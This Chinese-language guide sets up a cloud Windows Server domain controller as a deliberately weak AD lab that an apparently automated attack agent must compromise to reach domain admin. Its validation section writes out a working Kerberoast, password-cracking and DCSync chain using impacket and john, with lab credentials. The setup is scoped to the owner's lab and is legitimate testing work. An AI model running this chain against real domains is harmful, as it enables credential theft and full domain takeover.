# ad-lab · 云端真 Windows AD DC —— 完整落地步骤

为什么换云上真 Windows：Samba AD DC 与 impacket 的 Kerberos TGS 认证器（AES256 会话密钥）+
DRSUAPI DCSync 根本不兼容（实测 `KRB_AP_ERR_INAPP_CKSUM` / `byte indices`，MIT 客户端却正常），
Kerberoast→DCSync 这套标准攻击链在 Samba 上跑不通。真 Windows DC 上 impacket 完全正常。
Apple Silicon 本地只能跑 ARM，Windows Server 没有可用 ARM 版 → 用**云上 x64 Windows Server**。

## 拓扑

```
   本地 (Mac / Docker)                                 云上 (x64 Windows Server)
 ┌──────────────────────────┐                      ┌──────────────────────────────┐
 │ veritas-sandbox (Kali)   │   ── 公网(仅沙箱出口IP放行) ──►│ lab-dc  Windows Server 2022   │
 │  ad-lab_net, 有外网出口  │                      │ 域 veritas.lab                 │
 │ lab-member :8080 (注入)  │◄─ 读 config.ini 拿 IP┘ │ KDC/LDAP/SMB/DRSUAPI 攻击面   │
 └──────────────────────────┘                      └──────────────────────────────┘
```

攻击者 RCE member → 读 `/opt/app/config.ini` 拿 `webdev:Passw0rd!` + 云 DC 公网 IP →
从沙箱经公网对云 DC 跑 Kerberoast / AS-REP / RBCD / DCSync，直到 `domain_admin`。

---

## 关键参数（先记下）

- **沙箱出口公网 IP**（= 引擎沙箱连云 DC 时云端看到的源 IP，记作 `$MYIP`，形如 `203.0.113.5`；别把真实 IP 硬编码进仓库）。
  ⚠️ 家宽/办公网出口 IP 会变，**部署当天实测取**：在你 Mac 终端跑
  ```bash
  docker run --rm --network ad-lab_net veritas-sandbox:latest bash -lc 'curl -s ifconfig.me; echo'
  ```
  以它为准填进云防火墙（下面记作 `$MYIP`）。
- **云 DC 公网 IP**：部署后得到，下面记作 `$DCIP`，要回填到 member 的 config.ini 和 dispatch.yaml。
- 域：`veritas.lab`；DC 主机名：`lab-dc`；RID-500 内置域管 = 你建 VM 的本机管理员（Azure 上通常叫 `labadmin`，口令沿用你建 VM 时设的；域里通常**无** `Administrator` 账号，见 B 节 provision.ps1 说明）。

---

## A. 起云上 Windows Server VM（Azure CLI 示例）

> 用 Azure 做示例（Windows AD 最省事）；AWS/GCP 见文末等价说明。概念一致：一台 x64 Windows Server 2022 + 一个只放行你 IP 的安全组。

```bash
RG=veritas-ad; LOC=eastasia; VM=lab-dc
ADMIN=labadmin; ADMINPW='Choose-A-Strong-Pass!1'   # 首次 RDP / 本地管理员用，和域 administrator 无关
MYIP=203.0.113.5                                    # ← 换成上面 curl ifconfig.me 实测到的你的真实出口 IP

az group create -n $RG -l $LOC

# computer name 自动取 VM 名 lab-dc（≤15 字符，符合 AD 要求）；--nsg-rule NONE 先不开任何端口
az vm create -g $RG -n $VM \
  --image MicrosoftWindowsServer:WindowsServer:2022-datacenter-azure-edition:latest \
  --size Standard_B2s \
  --admin-username $ADMIN --admin-password "$ADMINPW" \
  --public-ip-sku Standard --nsg-rule NONE

DCIP=$(az vm show -g $RG -n $VM -d --query publicIps -o tsv); echo "DCIP=$DCIP"
```

## B. 提升为域控 + 预埋弱点（provision.ps1）

1. 临时放行 RDP（仅你的 IP）进去操作：
   ```bash
   NSG=$(az network nsg list -g $RG --query '[0].name' -o tsv)
   az network nsg rule create -g $RG --nsg-name $NSG -n allow-rdp --priority 1000 \
     --source-address-prefixes $MYIP/32 --destination-port-ranges 3389 --access Allow --protocol Tcp
   ```
2. RDP 到 `$DCIP`（用 `labadmin` / `$ADMINPW`）。把本仓库的
   [`provision.ps1`](./provision.ps1) 拷进去（RDP 剪贴板/拖拽均可）。
3. **以管理员 PowerShell 运行两次**：
   ```powershell
   # 第 1 次：装 AD DS 角色 + 提升为 veritas.lab 域控 → 自动重启
   .\provision.ps1
   # 重启登录后，第 2 次：建弱账号/SPN/ACL（幂等）
   .\provision.ps1
   ```
4. 校验（域控上）：
   ```powershell
   Get-ADGroupMember "Domain Admins"                      # 应含 svc-sql
   Get-ADUser svc-sql -Properties ServicePrincipalNames,msDS-SupportedEncryptionTypes
   Get-ADUser backup  -Properties DoesNotRequirePreAuth   # True
   nslookup lab-dc.veritas.lab 127.0.0.1                  # DC 自带 DNS 能解析
   ```

## C. 防火墙：AD 攻击面只放行沙箱出口 IP

```bash
NSG=$(az network nsg list -g $RG --query '[0].name' -o tsv)
# Kerberos/LDAP/SMB/GC/RPC-EPM + RPC 动态高端口(DRSUAPI DCSync 要)，仅 $MYIP
az network nsg rule create -g $RG --nsg-name $NSG -n allow-ad-tcp --priority 1010 \
  --source-address-prefixes $MYIP/32 \
  --destination-port-ranges 88 135 139 389 445 464 636 3268 3269 49152-65535 \
  --access Allow --protocol Tcp
az network nsg rule create -g $RG --nsg-name $NSG -n allow-ad-udp --priority 1020 \
  --source-address-prefixes $MYIP/32 \
  --destination-port-ranges 88 389 --access Allow --protocol Udp
```

> 收紧可选：把 NTDS 的 RPC 钉成静态端口（DC 上 `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters` 加 `TCP/IP Port`=DWORD，重启），就只需放行 `135` + 那个端口，不用开 `49152-65535`。
> 安全：AD 攻击面只对你的出口 IP 开；用完务必拆（文末）。别用任何真实口令。

## D. 本地接线（member 指向云 DC + dispatch）

```bash
cd /path/to/veritas
# 1) 停掉本地 Samba DC（云端模式用不到）
docker compose -f targets/ad-lab/docker-compose.yml stop dc    # 或 docker rm -f lab-dc
# 2) 用云 DC 公网 IP 重建 member（config.ini 会写成 lab-dc.veritas.lab ($DCIP)）
DC_IP=$DCIP docker compose -f targets/ad-lab/docker-compose.yml up -d --build --no-deps member
docker exec lab-member cat /opt/app/config.ini          # 确认 dc = ... ($DCIP)
# 3) dispatch.yaml：把 scope.cidrs 里的 <CLOUD_DC_PUBLIC_IP> 换成 $DCIP
#    （target=http://lab-member:8080 / goal=domain_admin / sandbox_network=ad-lab_net 已配好）
```

## E. 验证链路（烧 GLM 前的硬 gate）

从沙箱对云 DC 手动跑一遍整链，**确认真 Windows 上 impacket 通**（无 INAPP_CKSUM、能 DCSync 出 administrator hash）：

```bash
DCIP=<云DC公网IP>
docker run --rm --network ad-lab_net veritas-sandbox:latest bash -lc '
set +e; DC='"$DCIP"'
echo "[1] Kerberoast"; impacket-GetUserSPNs -request -dc-ip $DC "veritas.lab/webdev:Passw0rd!" -outputfile /tmp/ks.txt 2>&1 | tail -3
grep -o "\$krb5tgs\$[0-9]*\$[^ ]*" /tmp/ks.txt | head -c 90; echo
echo "[2] crack"; gunzip -kf /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ks.txt >/dev/null 2>&1; john --show /tmp/ks.txt
echo "[3] svc-sql ∈ Domain Admins?"; nxc ldap $DC -u webdev -p "Passw0rd!" --groups "Domain Admins" 2>&1 | tail -4
echo "[4] DCSync administrator"; impacket-secretsdump -dc-ip $DC "veritas.lab/svc-sql:Password1"@$DC -just-dc-user administrator 2>&1 | grep -i "administrator:500"
'
```

判成功：[1] 出 `$krb5tgs$23$...`（不再 INAPP_CKSUM）、[2] 破出 `Password1`、[4] 出 `Administrator:500:...:<NThash>:::`。
这几条都过 = 靶场链路通，可以跑 live。（给我回传 `$DCIP`，我也可以在这边替你跑这个 gate。）

## F. 跑 live（需 GLM key + 联网，在你终端）

```bash
export GLM_API_KEY=...; python -m veritas run
```

成功判据（= 本里程碑达成）：攻击图里出现 `access_level=domain_admin` 且 `verdict=verified` 的立足点、Observer 零告警。查：
```bash
docker exec veritas-postgres-1 psql -U veritas -d veritas -c \
 "SELECT label,access_level,verdict FROM footholds WHERE task_id=(SELECT id FROM tasks ORDER BY created_at DESC LIMIT 1);"
docker exec veritas-postgres-1 psql -U veritas -d veritas -c \
 "SELECT content->>'detail' FROM activity WHERE worker_id='observer' AND task_id=(SELECT id FROM tasks ORDER BY created_at DESC LIMIT 1);"
```

## 收尾 / 注意

- **出口 IP 变了连不上**：重跑 E 开头的 `curl ifconfig.me`，把新 IP 更新进 NSG 的 `allow-ad-*` 和 `allow-rdp`。
- **用完拆掉**（省钱 + 安全）：`az group delete -n veritas-ad --yes --no-wait`。
- **AWS 等价**：`Windows_Server-2022-English-Full-Base` AMI + 安全组入站仅 `$MYIP/32` 放行上面同一组端口；其余（provision.ps1、member、dispatch、验证、live）完全一致。
